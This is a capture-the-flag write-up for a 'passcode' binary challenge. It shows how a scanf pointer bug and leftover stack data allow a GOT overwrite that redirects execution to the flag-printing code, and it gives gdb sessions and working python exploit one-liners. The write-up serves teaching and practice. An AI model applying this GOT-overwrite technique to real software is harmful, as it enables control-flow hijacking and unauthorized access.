# Passcode

Okay, the problem is obviously in the `login` function:

```c
void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}
```

We call `scanf` with `passcode1` and `passcode2`, instead of their addresses, which means they will be treated as pointers and we can maybe exploit this to get some kind of write-what-where.

But how do we control `passcode1` and `passcode2`? They are just sitting on the stack... Well, we have this usful `welcome` function:

```c
void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}
```

which uses a big user supplied buffer on the stack. Lets test this theory in `gdb`:

```text
(gdb) break login
(gdb) r <<< $(python -c "print ''.join(chr(i) for i in range(0x41, 0x41 + 100))")
(gdb) x $ebp-0x10
0xff837ce8:     0xa4a3a2a1
(gdb) x $ebp-0xc
0xff837cec:     0xcda51200
```

Hmm... seems like we can only override `passcode1`, so the startegy of making each of them point to themsevles and just input the passcodes breaks down.

But the writing to the adderss pointed to by `passcode1` happens from within the stack frame of `scanf`, so maybe we can run over that saved `eip` (running over the saved `eip` of `login`s stack frame isnt that usful, since theres a call to `exit`...).

But, the stack is randomized! Oh shit, what do we do know... we cant know where `scanf`'s return address will be saved! Lets look for another idea...

Consider this code:

```text
(gdb) disas 0x80484a0
Dump of assembler code for function __isoc99_scanf@plt:
   0x080484a0 <+0>:     jmp    DWORD PTR ds:0x804a020
   0x080484a6 <+6>:     push   0x40
   0x080484ab <+11>:    jmp    0x8048410
End of assembler dump.
```

This looks a call to a `got` function, which means that if we overrite `0x804a020`, every call to `scanf` will jump to wherever we want, for example to `*login+115` (`0x080485d7`), which is the part that prints the flag.

Lets give it a try! We saw that `passcode1` was overriten to be `0xa4a3a2a1`, which means its at an offset of `0x60` bytes from the start of `name` (in `welcome`).

So our exploit will look a little like this:

```bash
python -c 'print "A" * 0x60 + "\x20\xa0\x04\x08" + "\n" + "134514135"' | ./passcode
```

Well, that didnt work... Why? That nasty little space (`\x20`)! Well, lets just look for another `got` entry to overrite! `fflush` seems to be ok...

```bash
python -c 'print "A" * 0x60 + "\x04\xa0\x04\x08" + "\n" + "134514135"' | ./passcode
```

Woohoo!